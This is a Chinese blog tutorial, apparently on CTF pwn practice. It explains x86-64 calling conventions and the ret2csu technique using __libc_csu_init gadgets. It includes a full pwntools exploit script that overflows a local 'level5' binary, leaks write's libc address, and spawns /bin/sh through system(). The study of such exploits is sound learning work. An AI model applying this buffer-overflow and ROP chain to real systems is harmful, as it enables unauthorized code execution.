@@ -1,0 +1,556 @@
+
+
+
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta name="referrer" content="no-referrer"/>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#FFF">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+<link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico">
+  <meta http-equiv="Cache-Control" content="no-transform">
+  <meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+<link rel="alternate" type="application/rss+xml" title="golden的部落阁" href="http://blog.g01den.top/rss.xml" />
+<link rel="alternate" type="application/atom+xml" title="golden的部落阁" href="http://blog.g01den.top/atom.xml" />
+<link rel="alternate" type="application/json" title="golden的部落阁" href="http://blog.g01den.top/feed.json" />
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="/css/app.css?v=0.2.5">
+
+  
+  <meta name="keywords" content="Pwn" />
+
+
+<link rel="canonical" href="http://blog.g01den.top/posts/c8624158.html">
+
+
+
+  <title>
+pwn学习笔记（9）-中级ROP--ret2csu - Pwn手的自我修养 |
+golden的部落阁 = golden的部落阁 = subtitle写得真好</title>
+<meta name="generator" content="Hexo 7.2.0"></head>
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div id="loading">
+    <div class="cat">
+      <div class="body"></div>
+      <div class="head">
+        <div class="face"></div>
+      </div>
+      <div class="foot">
+        <div class="tummy-end"></div>
+        <div class="bottom"></div>
+        <div class="legs left"></div>
+        <div class="legs right"></div>
+      </div>
+      <div class="paw">
+        <div class="hands left"></div>
+        <div class="hands right"></div>
+      </div>
+    </div>
+  </div>
+  <div id="container">
+    <header id="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="inner">
+        <div id="brand">
+          <div class="pjax">
+          
+  <h1 itemprop="name headline">pwn学习笔记（9）-中级ROP--ret2csu
+  </h1>
+  
+<div class="meta">
+  <span class="item" title="创建时间：2024-08-09 02:55:43">
+    <span class="icon">
+      <i class="ic i-calendar"></i>
+    </span>
+    <span class="text">发表于</span>
+    <time itemprop="dateCreated datePublished" datetime="2024-08-09T02:55:43+08:00">2024-08-09</time>
+  </span>
+</div>
+
+
+          </div>
+        </div>
+        <nav id="nav">
+  <div class="inner">
+    <div class="toggle">
+      <div class="lines" aria-label="切换导航栏">
+        <span class="line"></span>
+        <span class="line"></span>
+        <span class="line"></span>
+      </div>
+    </div>
+    <ul class="menu">
+      <li class="item title"><a href="/" rel="start">golden的部落阁</a></li>
+    </ul>
+    <ul class="right">
+      <li class="item theme">
+        <i class="ic i-sun"></i>
+      </li>
+      <li class="item search">
+        <i class="ic i-search"></i>
+      </li>
+    </ul>
+  </div>
+</nav>
+
+      </div>
+      <div id="imgs" class="pjax">
+          <img src="https://gitee.com/gou-dengyue/images/raw/master/picture310.jpg">
+      </div>
+    </header>
+    <div id="waves">
+      <svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto">
+        <defs>
+          <path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z" />
+        </defs>
+        <g class="parallax">
+          <use xlink:href="#gentle-wave" x="48" y="0" />
+          <use xlink:href="#gentle-wave" x="48" y="3" />
+          <use xlink:href="#gentle-wave" x="48" y="5" />
+          <use xlink:href="#gentle-wave" x="48" y="7" />
+        </g>
+      </svg>
+    </div>
+    <main>
+      <div class="inner">
+        <div id="main" class="pjax">
+          
+  <div class="article wrap">
+    
+<div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList">
+<i class="ic i-home"></i>
+<span><a href="/">首页</a></span><i class="ic i-angle-right"></i>
+<span  class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/Pwn/" itemprop="item" rel="index" title="分类于 Pwn手的自我修养"><span itemprop="name">Pwn手的自我修养</span></a>
+<meta itemprop="position" content="1" /></span>
+</div>
+
+    <article itemscope itemtype="http://schema.org/Article" class="post block" lang="zh-CN">
+  <link itemprop="mainEntityOfPage" href="http://blog.g01den.top/posts/c8624158.html">
+
+  <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="image" content="/images/avatar.jpg">
+    <meta itemprop="name" content="g01den">
+    <meta itemprop="description" content="subtitle写得真好, golden的部落阁">
+  </span>
+
+  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="golden的部落阁">
+  </span>
+
+  <div class="body md" itemprop="articleBody">
+    
+
+    <h1 id="pwn学习笔记9-中级ropret2csu"><a class="markdownIt-Anchor" href="#pwn学习笔记9-中级ropret2csu">#</a> pwn 学习笔记（9）- 中级 ROP–ret2csu</h1>
+<h2 id="前置知识"><a class="markdownIt-Anchor" href="#前置知识">#</a> 前置知识</h2>
+<p>​		首先是 64 位文件的传参方式：前六个参数是从左到右放入寄存器：rdi、rsi、rdx、rcx、r8、r9，之后的通过栈传参。</p>
+<p>​		比如：</p>
+<blockquote>
+<p>传参函数大于 7 个：</p>
+<p>H(a,b,c,d,e,f,g,h)</p>
+<p>a-&gt;%rdi、b-&gt;%rsi、c-&gt;%rdx、d-&gt;%rcx、e-&gt;%r8、f-&gt;%r9</p>
+<p>h-&gt;(%esp)</p>
+<p>g-&gt;(%esp)</p>
+<p>call H</p>
+</blockquote>
+<p>​		先看看如下代码：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdio.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">H</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b,<span class="type">int</span> c,<span class="type">int</span> d,<span class="type">int</span> e,<span class="type">int</span> f,<span class="type">int</span> g,<span class="type">int</span> h)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">int</span> a = <span class="number">1</span>,b = <span class="number">2</span>,c = <span class="number">3</span>,d = <span class="number">4</span>,e = <span class="number">5</span>,f = <span class="number">6</span>,g = <span class="number">7</span>,h = <span class="number">8</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,H(a,b,c,d,e,f,g,h));</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">H</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b,<span class="type">int</span> c,<span class="type">int</span> d,<span class="type">int</span> e,<span class="type">int</span> f,<span class="type">int</span> g,<span class="type">int</span> h)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> a+b+c+d+e+f+g+h;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>​		之后反汇编一下 main 函数和 H 函数的代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">0000000000001149 &lt;main&gt;:</span><br><span class="line">    1149:       f3 0f 1e fa             endbr64</span><br><span class="line">    114d:       55                      push   rbp</span><br><span class="line">    114e:       48 89 e5                mov    rbp,rsp</span><br><span class="line">    1151:       48 83 ec 20             sub    rsp,0x20</span><br><span class="line">    1155:       c7 45 e0 01 00 00 00    mov    DWORD PTR [rbp-0x20],0x1</span><br><span class="line">    115c:       c7 45 e4 02 00 00 00    mov    DWORD PTR [rbp-0x1c],0x2</span><br><span class="line">    1163:       c7 45 e8 03 00 00 00    mov    DWORD PTR [rbp-0x18],0x3</span><br><span class="line">    116a:       c7 45 ec 04 00 00 00    mov    DWORD PTR [rbp-0x14],0x4</span><br><span class="line">    1171:       c7 45 f0 05 00 00 00    mov    DWORD PTR [rbp-0x10],0x5</span><br><span class="line">    1178:       c7 45 f4 06 00 00 00    mov    DWORD PTR [rbp-0xc],0x6</span><br><span class="line">    117f:       c7 45 f8 07 00 00 00    mov    DWORD PTR [rbp-0x8],0x7</span><br><span class="line">    1186:       c7 45 fc 08 00 00 00    mov    DWORD PTR [rbp-0x4],0x8</span><br><span class="line">    118d:       44 8b 4d f4             mov    r9d,DWORD PTR [rbp-0xc]</span><br><span class="line">    1191:       44 8b 45 f0             mov    r8d,DWORD PTR [rbp-0x10]</span><br><span class="line">    1195:       8b 4d ec                mov    ecx,DWORD PTR [rbp-0x14]</span><br><span class="line">    1198:       8b 55 e8                mov    edx,DWORD PTR [rbp-0x18]</span><br><span class="line">    119b:       8b 75 e4                mov    esi,DWORD PTR [rbp-0x1c]</span><br><span class="line">    119e:       8b 45 e0                mov    eax,DWORD PTR [rbp-0x20]</span><br><span class="line">    11a1:       8b 7d fc                mov    edi,DWORD PTR [rbp-0x4]</span><br><span class="line">    11a4:       57                      push   rdi</span><br><span class="line">    11a5:       8b 7d f8                mov    edi,DWORD PTR [rbp-0x8]</span><br><span class="line">    11a8:       57                      push   rdi</span><br><span class="line">    11a9:       89 c7                   mov    edi,eax</span><br><span class="line">    11ab:       e8 1e 00 00 00          call   11ce &lt;H&gt;</span><br><span class="line">    11b0:       48 83 c4 10             add    rsp,0x10</span><br><span class="line">    11b4:       89 c6                   mov    esi,eax</span><br><span class="line">    11b6:       48 8d 3d 47 0e 00 00    lea    rdi,[rip+0xe47]        # 2004 &lt;_IO_stdin_used+0x4&gt;</span><br><span class="line">    11bd:       b8 00 00 00 00          mov    eax,0x0</span><br><span class="line">    11c2:       e8 89 fe ff ff          call   1050 &lt;printf@plt&gt;</span><br><span class="line">    11c7:       b8 00 00 00 00          mov    eax,0x0</span><br><span class="line">    11cc:       c9                      leave</span><br><span class="line">    11cd:       c3                      ret</span><br><span class="line"></span><br><span class="line">00000000000011ce &lt;H&gt;:</span><br><span class="line">    11ce:       f3 0f 1e fa             endbr64</span><br><span class="line">    11d2:       55                      push   rbp</span><br><span class="line">    11d3:       48 89 e5                mov    rbp,rsp</span><br><span class="line">    11d6:       89 7d fc                mov    DWORD PTR [rbp-0x4],edi</span><br><span class="line">    11d9:       89 75 f8                mov    DWORD PTR [rbp-0x8],esi</span><br><span class="line">    11dc:       89 55 f4                mov    DWORD PTR [rbp-0xc],edx</span><br><span class="line">    11df:       89 4d f0                mov    DWORD PTR [rbp-0x10],ecx</span><br><span class="line">    11e2:       44 89 45 ec             mov    DWORD PTR [rbp-0x14],r8d</span><br><span class="line">    11e6:       44 89 4d e8             mov    DWORD PTR [rbp-0x18],r9d</span><br><span class="line">    11ea:       8b 55 fc                mov    edx,DWORD PTR [rbp-0x4]</span><br><span class="line">    11ed:       8b 45 f8                mov    eax,DWORD PTR [rbp-0x8]</span><br><span class="line">    11f0:       01 c2                   add    edx,eax</span><br><span class="line">    11f2:       8b 45 f4                mov    eax,DWORD PTR [rbp-0xc]</span><br><span class="line">    11f5:       01 c2                   add    edx,eax</span><br><span class="line">    11f7:       8b 45 f0                mov    eax,DWORD PTR [rbp-0x10]</span><br><span class="line">    11fa:       01 c2                   add    edx,eax</span><br><span class="line">    11fc:       8b 45 ec                mov    eax,DWORD PTR [rbp-0x14]</span><br><span class="line">    11ff:       01 c2                   add    edx,eax</span><br><span class="line">    1201:       8b 45 e8                mov    eax,DWORD PTR [rbp-0x18]</span><br><span class="line">    1204:       01 c2                   add    edx,eax</span><br><span class="line">    1206:       8b 45 10                mov    eax,DWORD PTR [rbp+0x10]</span><br><span class="line">    1209:       01 c2                   add    edx,eax</span><br><span class="line">    120b:       8b 45 18                mov    eax,DWORD PTR [rbp+0x18]</span><br><span class="line">    120e:       01 d0                   add    eax,edx</span><br><span class="line">    1210:       5d                      pop    rbp</span><br><span class="line">    1211:       c3                      ret</span><br></pre></td></tr></table></figure>
+<p>​		很明显的就是前六个参数是寄存器传参，剩下两个就是栈传参。</p>
+<h2 id="libc_csu_init函数基础"><a class="markdownIt-Anchor" href="#libc_csu_init函数基础">#</a>  <code>libc_csu_init</code>  函数基础：</h2>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000001220</span><br><span class="line">.text:0000000000001220 ; =============== S U B R O U T I N E =======================================</span><br><span class="line">.text:0000000000001220</span><br><span class="line">.text:0000000000001220</span><br><span class="line">.text:0000000000001220 ; void _libc_csu_init(void)</span><br><span class="line">.text:0000000000001220                 public __libc_csu_init</span><br><span class="line">.text:0000000000001220 __libc_csu_init proc near               ; DATA XREF: _start+1A↑o</span><br><span class="line">.text:0000000000001220 ; __unwind &#123;</span><br><span class="line">.text:0000000000001220                 endbr64</span><br><span class="line">.text:0000000000001224                 push    r15</span><br><span class="line">.text:0000000000001226                 lea     r15, __frame_dummy_init_array_entry</span><br><span class="line">.text:000000000000122D                 push    r14</span><br><span class="line">.text:000000000000122F                 mov     r14, rdx</span><br><span class="line">.text:0000000000001232                 push    r13</span><br><span class="line">.text:0000000000001234                 mov     r13, rsi</span><br><span class="line">.text:0000000000001237                 push    r12</span><br><span class="line">.text:0000000000001239                 mov     r12d, edi</span><br><span class="line">.text:000000000000123C                 push    rbp</span><br><span class="line">.text:000000000000123D                 lea     rbp, __do_global_dtors_aux_fini_array_entry</span><br><span class="line">.text:0000000000001244                 push    rbx</span><br><span class="line">.text:0000000000001245                 sub     rbp, r15</span><br><span class="line">.text:0000000000001248                 sub     rsp, 8</span><br><span class="line">.text:000000000000124C                 call    _init_proc</span><br><span class="line">.text:0000000000001251                 sar     rbp, 3</span><br><span class="line">.text:0000000000001255                 jz      short loc_1276</span><br><span class="line">.text:0000000000001257                 xor     ebx, ebx</span><br><span class="line">.text:0000000000001259                 nop     dword ptr [rax+00000000h]</span><br><span class="line">.text:0000000000001260</span><br><span class="line">.text:0000000000001260 loc_1260:                               ; CODE XREF: __libc_csu_init+54↓j</span><br><span class="line">.text:0000000000001260                 mov     rdx, r14</span><br><span class="line">.text:0000000000001263                 mov     rsi, r13</span><br><span class="line">.text:0000000000001266                 mov     edi, r12d</span><br><span class="line">.text:0000000000001269                 call    ds:(__frame_dummy_init_array_entry - 3DB8h)[r15+rbx*8]</span><br><span class="line">.text:000000000000126D                 add     rbx, 1</span><br><span class="line">.text:0000000000001271                 cmp     rbp, rbx</span><br><span class="line">.text:0000000000001274                 jnz     short loc_1260</span><br><span class="line">.text:0000000000001276</span><br><span class="line">.text:0000000000001276 loc_1276:                               ; CODE XREF: __libc_csu_init+35↑j</span><br><span class="line">.text:0000000000001276                 add     rsp, 8</span><br><span class="line">.text:000000000000127A                 pop     rbx</span><br><span class="line">.text:000000000000127B                 pop     rbp</span><br><span class="line">.text:000000000000127C                 pop     r12</span><br><span class="line">.text:000000000000127E                 pop     r13</span><br><span class="line">.text:0000000000001280                 pop     r14</span><br><span class="line">.text:0000000000001282                 pop     r15</span><br><span class="line">.text:0000000000001284                 retn</span><br><span class="line">.text:0000000000001284 ; &#125; // starts at 1220</span><br></pre></td></tr></table></figure>
+<p>​		这里我们可以利用下面的几个点，上汇编：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000001276 loc_1276:                               ; CODE XREF: __libc_csu_init+35↑j</span><br><span class="line">.text:0000000000001276                 add     rsp, 8</span><br><span class="line">.text:000000000000127A                 pop     rbx</span><br><span class="line">.text:000000000000127B                 pop     rbp</span><br><span class="line">.text:000000000000127C                 pop     r12</span><br><span class="line">.text:000000000000127E                 pop     r13</span><br><span class="line">.text:0000000000001280                 pop     r14</span><br><span class="line">.text:0000000000001282                 pop     r15</span><br><span class="line">.text:0000000000001284                 retn</span><br></pre></td></tr></table></figure>
+<p>​		发现了这里可以修改个别寄存器的值，然后是这儿，可以修改传参用的那几个寄存器的值：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000001260 loc_1260:                               ; CODE XREF: __libc_csu_init+54↓j</span><br><span class="line">.text:0000000000001260                 mov     rdx, r14</span><br><span class="line">.text:0000000000001263                 mov     rsi, r13</span><br><span class="line">.text:0000000000001266                 mov     edi, r12d</span><br><span class="line">.text:0000000000001269                 call    ds:(__frame_dummy_init_array_entry - 3DB8h)[r15+rbx*8]</span><br><span class="line">.text:000000000000126D                 add     rbx, 1</span><br><span class="line">.text:0000000000001271                 cmp     rbp, rbx</span><br><span class="line">.text:0000000000001274                 jnz     short loc_1260</span><br></pre></td></tr></table></figure>
+<p>​		由此，我们可以通过控制 r13 等和传参用的寄存器相对应的来进行 ret2syscall 等操作。</p>
+<h2 id="例子"><a class="markdownIt-Anchor" href="#例子">#</a> 例子：</h2>
+<p>​		先看看架构：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">g01den@MSI:~/Temp$ checksec pwn</span><br><span class="line">[*] &#x27;/home/g01den/Temp/pwn&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
+<p>​		IDA 分析：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">vulnerable_function</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">128</span>]; <span class="comment">// [rsp+0h] [rbp-80h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x200</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>​		然后看看 <code>__libc_csu_init</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004005C0</span><br><span class="line">.text:00000000004005C0 ; =============== S U B R O U T I N E =======================================</span><br><span class="line">.text:00000000004005C0</span><br><span class="line">.text:00000000004005C0</span><br><span class="line">.text:00000000004005C0 ; void __fastcall _libc_csu_init(unsigned int, __int64, __int64)</span><br><span class="line">.text:00000000004005C0                 public __libc_csu_init</span><br><span class="line">.text:00000000004005C0 __libc_csu_init proc near               ; DATA XREF: _start+16↑o</span><br><span class="line">.text:00000000004005C0 ; __unwind &#123;</span><br><span class="line">.text:00000000004005C0                 push    r15</span><br><span class="line">.text:00000000004005C2                 push    r14</span><br><span class="line">.text:00000000004005C4                 mov     r15d, edi</span><br><span class="line">.text:00000000004005C7                 push    r13</span><br><span class="line">.text:00000000004005C9                 push    r12</span><br><span class="line">.text:00000000004005CB                 lea     r12, __frame_dummy_init_array_entry</span><br><span class="line">.text:00000000004005D2                 push    rbp</span><br><span class="line">.text:00000000004005D3                 lea     rbp, __do_global_dtors_aux_fini_array_entry</span><br><span class="line">.text:00000000004005DA                 push    rbx</span><br><span class="line">.text:00000000004005DB                 mov     r14, rsi</span><br><span class="line">.text:00000000004005DE                 mov     r13, rdx</span><br><span class="line">.text:00000000004005E1                 sub     rbp, r12</span><br><span class="line">.text:00000000004005E4                 sub     rsp, 8</span><br><span class="line">.text:00000000004005E8                 sar     rbp, 3</span><br><span class="line">.text:00000000004005EC                 call    _init_proc</span><br><span class="line">.text:00000000004005F1                 test    rbp, rbp</span><br><span class="line">.text:00000000004005F4                 jz      short loc_400616</span><br><span class="line">.text:00000000004005F6                 xor     ebx, ebx</span><br><span class="line">.text:00000000004005F8                 nop     dword ptr [rax+rax+00000000h]</span><br><span class="line">.text:0000000000400600</span><br><span class="line">.text:0000000000400600 loc_400600:                             ; CODE XREF: __libc_csu_init+54↓j</span><br><span class="line">.text:0000000000400600                 mov     rdx, r13</span><br><span class="line">.text:0000000000400603                 mov     rsi, r14</span><br><span class="line">.text:0000000000400606                 mov     edi, r15d</span><br><span class="line">.text:0000000000400609                 call    ds:(__frame_dummy_init_array_entry - 600E10h)[r12+rbx*8]</span><br><span class="line">.text:000000000040060D                 add     rbx, 1</span><br><span class="line">.text:0000000000400611                 cmp     rbx, rbp</span><br><span class="line">.text:0000000000400614                 jnz     short loc_400600</span><br><span class="line">.text:0000000000400616</span><br><span class="line">.text:0000000000400616 loc_400616:                             ; CODE XREF: __libc_csu_init+34↑j</span><br><span class="line">.text:0000000000400616                 add     rsp, 8</span><br><span class="line">.text:000000000040061A                 pop     rbx</span><br><span class="line">.text:000000000040061B                 pop     rbp</span><br><span class="line">.text:000000000040061C                 pop     r12</span><br><span class="line">.text:000000000040061E                 pop     r13</span><br><span class="line">.text:0000000000400620                 pop     r14</span><br><span class="line">.text:0000000000400622                 pop     r15</span><br><span class="line">.text:0000000000400624                 retn</span><br><span class="line">.text:0000000000400624 ; &#125; // starts at 4005C0</span><br></pre></td></tr></table></figure>
+<p>​		由下面这个点可以知道，可以控制的寄存器为 edi、rsi、rdx，另外， <code>call    ds:(__frame_dummy_init_array_entry - 600E10h)[r12+rbx*8]</code>  还使得可以调用 r12+rbx*8 的一个地址的函数，所以，这里可以利用 r12 来跳转到 write 函数来泄露 write 函数的地址，然后就可以通过 ret2libc 来获得 shell，</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./level5&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;level5&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_addr = <span class="number">0x40061a</span></span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">mov_addr = <span class="number">0x400600</span></span><br><span class="line">main_addr = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Hello, World\n&#x27;</span>)</span><br><span class="line">payload0 = <span class="string">&#x27;A&#x27;</span>*<span class="number">136</span> + p64(pop_addr) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(write_got) + p64(<span class="number">8</span>) + p64(write_got) + p64(<span class="number">1</span>) + p64(mov_addr) + <span class="string">&#x27;a &#x27;</span>*(<span class="number">0x8</span>+<span class="number">8</span>*<span class="number">6</span>) + p64(main_addr)</span><br><span class="line">p.sendline(payload0)</span><br><span class="line"></span><br><span class="line">write_start = u64(p.recv(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;write_addr_in_memory_is &quot;</span>+<span class="built_in">hex</span>(write_start)</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&#x27;/usr/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment">#libc=ELF(&#x27;libc.so.6&#x27;)</span></span><br><span class="line"></span><br><span class="line">libc_base=write_start-libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">system_addr=libc.symbols[<span class="string">&#x27;system&#x27;</span>]+libc_base</span><br><span class="line">binsh=<span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>))+libc_base</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;libc_base_addr_in_memory_is &quot;</span>+<span class="built_in">hex</span>(libc_base)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;system_addr_in_memory_is &quot;</span>+<span class="built_in">hex</span>(system_addr)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;/bin/sh_addr_in_memory_is &quot;</span>+<span class="built_in">hex</span>(binsh)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret=<span class="number">0x400623</span></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x88</span>+p64(pop_rdi_ret)+p64(binsh)+p64(system_addr)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+      <div class="tags">
+          <a href="/tags/Pwn/" rel="tag"><i class="ic i-tag"></i> Pwn</a>
+      </div>
+  </div>
